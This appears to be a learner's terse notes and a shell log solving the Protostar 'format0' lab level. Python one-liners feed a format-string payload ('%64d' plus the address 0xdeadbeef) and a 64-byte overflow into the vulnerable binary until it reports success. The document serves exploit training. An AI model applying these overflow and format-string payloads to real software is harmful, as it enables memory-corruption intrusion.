two way stack over flow and format string
%x print the hex 
%nd use for print the space or we can say after n we can add our address "%64d\xef\xbe\xad\xde"


user@protostar:/opt/protostar/bin$ python -c "print 'AAAA'+'%x'"
AAAA%x
user@protostar:/opt/protostar/bin$ python -c "print 'AAAA'+'%x'" | ./format0
user@protostar:/opt/protostar/bin$ python -c "print 'AAAA'+'%x'" | ./format0
close failed in file object destructor:
Error in sys.excepthook:

Original exception was:
user@protostar:/opt/protostar/bin$ /opt/protostar/bin/format0 $(python -c "print '%x'")
user@protostar:/opt/protostar/bin$ /opt/protostar/bin/format0 $(python -c "print '%d'")
user@protostar:/opt/protostar/bin$ /opt/protostar/bin/format0 $(python -c "print '%64d'")
user@protostar:/opt/protostar/bin$ ./format0 $(python -c "print '%64d\xef\xbe\xad\xde'")
you have hit the target correctly :)
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ python -c "print 'AAAA'*64+'\xef\xbe\xad\xde'" | ./format0
close failed in file object destructor:
Error in sys.excepthook:

Original exception was:
user@protostar:/opt/protostar/bin$ python -c "print 'A'*64+'\xef\xbe\xad\xde'" | ./format0
close failed in file object destructor:
Error in sys.excepthook:

Original exception was:
user@protostar:/opt/protostar/bin$ ./format0 $(python -c "print 'A'*64+'\xef\xbe\xad\xde'")
you have hit the target correctly :)
user@
